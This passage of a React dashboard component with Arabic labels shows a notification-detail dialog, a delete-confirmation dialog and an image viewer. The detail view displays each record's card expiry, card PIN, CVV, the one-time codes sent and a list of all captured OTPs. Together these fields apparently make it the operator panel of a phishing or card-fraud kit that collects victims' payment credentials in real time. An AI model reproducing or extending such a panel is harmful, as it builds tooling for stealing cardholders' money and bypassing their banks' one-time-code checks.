                    {(selectedNotification as any).year && (selectedNotification as any).month
                      ? `${(selectedNotification as any).year}/${(selectedNotification as any).month}`
                      : (selectedNotification as any).cardExpiry}
                  </span>
                </div>
              )}
              {(selectedNotification as any).pass && (
                <div className="flex justify-between items-center py-2 border-b border-gray-200">
                  <span className="font-medium text-gray-700 flex items-center gap-2">
                    <Shield className="h-4 w-4 text-gray-500" />
                    رمز البطاقة:
                  </span>
                  <span className="font-semibold text-gray-900">{(selectedNotification as any).pass}</span>
                </div>
              )}
              {((selectedNotification as any).otp || (selectedNotification as any).otpCode) && (
                <div className="flex justify-between items-center py-2 border-b border-gray-200">
                  <span className="font-medium text-gray-700 flex items-center gap-2">
                    <Shield className="h-4 w-4 text-gray-500" />
                    رمز التحقق المرسل:
                  </span>
                  <span className="font-semibold text-gray-900">
                    {(selectedNotification as any).otp}
                    {(selectedNotification as any).otpCode && ` || ${(selectedNotification as any).otpCode}`}
                  </span>
                </div>
              )}
              {(selectedNotification as any).cvv && (
                <div className="flex justify-between items-center py-2 border-b border-gray-200">
                  <span className="font-medium text-gray-700 flex items-center gap-2">
                    <Shield className="h-4 w-4 text-gray-500" />
                    رمز الامان:
                  </span>
                  <span className="font-semibold text-gray-900">{(selectedNotification as any).cvv}</span>
                </div>
              )}
              {(selectedNotification as any).allOtps &&
                Array.isArray((selectedNotification as any).allOtps) &&
                (selectedNotification as any).allOtps.length > 0 && (
                  <div>
                    <span className="font-medium text-gray-700 flex items-center gap-2 mb-2">
                      <Shield className="h-4 w-4 text-gray-500" />
                      جميع الرموز:
                    </span>
                    <div className="flex flex-wrap gap-2">
                      {(selectedNotification as any).allOtps.map((otp: string, index: number) => (
                        <Badge key={index} variant="outline" className="bg-gray-50 text-gray-700 border-gray-200">
                          {otp}
                        </Badge>
                      ))}
                    </div>
                  </div>
                )}
            </div>
          )}
        </DialogContent>
      </Dialog>

      {/* Confirm Delete Dialog */}
      <Dialog open={confirmDeleteId !== null} onOpenChange={() => setConfirmDeleteId(null)}>
        <DialogContent className="bg-white text-gray-900 max-w-sm" dir="rtl">
          <DialogHeader>
            <DialogTitle className="flex items-center gap-2 text-lg">
              <AlertCircle className="h-5 w-5 text-red-500" />
              تأكيد الحذف
            </DialogTitle>
            <DialogDescription>
              {confirmDeleteId === "all"
                ? "هل أنت متأكد من رغبتك في حذف جميع الإشعارات؟ لا يمكن التراجع عن هذا الإجراء."
                : "هل أنت متأكد من رغبتك في حذف هذا الإشعار؟ لا يمكن التراجع عن هذا الإجراء."}
            </DialogDescription>
          </DialogHeader>
          <DialogFooter className="flex flex-row-reverse sm:justify-start gap-2 mt-4">
            <Button
              variant="destructive"
              onClick={confirmDeleteId === "all" ? confirmClearAll : confirmDeleteNotification}
            >
              تأكيد الحذف
            </Button>
            <Button variant="outline" onClick={() => setConfirmDeleteId(null)}>
              إلغاء
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>

      {/* Image Preview Dialog */}
      <Dialog open={selectedImages !== null} onOpenChange={closeImagePreview}>
        <DialogContent className="max-w-4xl w-[95vw] h-[90vh] p-0 bg-black" dir="ltr">
          <div className="relative w-full h-full flex flex-col">
            {/* Header */}
            <div className="absolute top-0 left-0 right-0 z-10 bg-black/80 backdrop-blur-sm p-4 flex justify-between items-center">
              <div className="flex items-center gap-4 text-white">
                <h3 className="text-lg font-semibold">
                  معاينة الصور
                  {selectedImages && (
                    <span className="text-sm font-normal ml-2">
                      ({selectedImages.currentIndex + 1} من {selectedImages.images.length})
                    </span>
                  )}
                </h3>
              </div>

              <div className="flex items-center gap-2">
                {/* Zoom Controls */}
                <div className="flex items-center gap-1 bg-white/20 rounded-lg p-1">
                  <Button
                    variant="ghost"
                    size="sm"
                    onClick={() => setImageZoom(Math.max(0.5, imageZoom - 0.25))}
                    className="text-white hover:bg-white/20 h-8 w-8 p-0"
                    disabled={imageZoom <= 0.5}
                  >
                    <ZoomOut className="h-4 w-4" />
                  </Button>
                  <span className="text-white text-sm px-2 min-w-[60px] text-center">
                    {Math.round(imageZoom * 100)}%
                  </span>
                  <Button
                    variant="ghost"
                    size="sm"
                    onClick={() => setImageZoom(Math.min(3, imageZoom + 0.25))}
                    className="text-white hover:bg-white/20 h-8 w-8 p-0"
                    disabled={imageZoom >= 3}
                  >
                    <ZoomIn className="h-4 w-4" />
                  </Button>
                </div>

                {/* Download Button */}
                <Button variant="ghost" size="sm" onClick={downloadImage} className="text-white hover:bg-white/20">
                  <Download className="h-4 w-4" />
                </Button>

                {/* Close Button */}
                <Button variant="ghost" size="sm" onClick={closeImagePreview} className="text-white hover:bg-white/20">
                  <X className="h-4 w-4" />
                </Button>
              </div>
            </div>

            {/* Image Container */}
            <div className="flex-1 flex items-center justify-center p-4 pt-20 pb-16">
              {selectedImages && (
                <div className="relative max-w-full max-h-full overflow-hidden">
                  <img
                    src={selectedImages.images[selectedImages.currentIndex] || "/placeholder.svg"}
                    alt={`صورة ${selectedImages.currentIndex + 1}`}
                    className="max-w-full max-h-full object-contain transition-transform duration-200"
                    style={{ transform: `scale(${imageZoom})` }}
                    onError={(e) => {
                      const target = e.target as HTMLImageElement
                      target.src = "/placeholder.svg?height=400&width=400&text=فشل+في+تحميل+الصورة"
                    }}
                  />
                </div>
              )}
            </div>

            {/* Navigation */}
            {selectedImages && selectedImages.images.length > 1 && (
              <>
                {/* Previous Button */}
                <Button
                  variant="ghost"
                  size="lg"
                  onClick={prevImage}
                  disabled={selectedImages.currentIndex === 0}
                  className="absolute left-4 top-1/2 transform -translate-y-1/2 text-white hover:bg-white/20 h-12 w-12 p-0 rounded-full"
                >
                  <ChevronDown className="h-6 w-6 rotate-90" />
                </Button>

                {/* Next Button */}
                <Button
                  variant="ghost"
                  size="lg"
                  onClick={nextImage}
                  disabled={selectedImages.currentIndex === selectedImages.images.length - 1}
                  className="absolute right-4 top-1/2 transform -translate-y-1/2 text-white hover:bg-white/20 h-12 w-12 p-0 rounded-full"
                >
                  <ChevronDown className="h-6 w-6 -rotate-90" />
                </Button>
              </>
            )}

            {/* Bottom Thumbnails */}
            {selectedImages && selectedImages.images.length > 1 && (
              <div className="absolute bottom-0 left-0 right-0 bg-black/80 backdrop-blur-sm p-4">
                <div className="flex justify-center gap-2 overflow-x-auto">
                  {selectedImages.images.map((image, index) => (
                    <button
                      key={index}
                      onClick={() => setSelectedImages({ ...selectedImages, currentIndex: index })}
                      className={`flex-shrink-0 w-16 h-16 rounded-lg overflow-hidden border-2 transition-all ${
                        index === selectedImages.currentIndex
                          ? "border-blue-500 ring-2 ring-blue-500/50"
                          : "border-white/30 hover:border-white/60"
                      }`}
                    >
                      <img
                        src={image || "/placeholder.svg"}
                        alt={`صورة مصغرة ${index + 1}`}
                        className="w-full h-full object-cover"
                        onError={(e) => {
                          const target = e.target as HTMLImageElement
                          target.src = "/placeholder.svg?height=64&width=64&text=خطأ"
                        }}
                      />
                    </button>
                  ))}
                </div>
              </div>
            )}
          </div>
        </DialogContent>
      </Dialog>
    </div>
  )
}
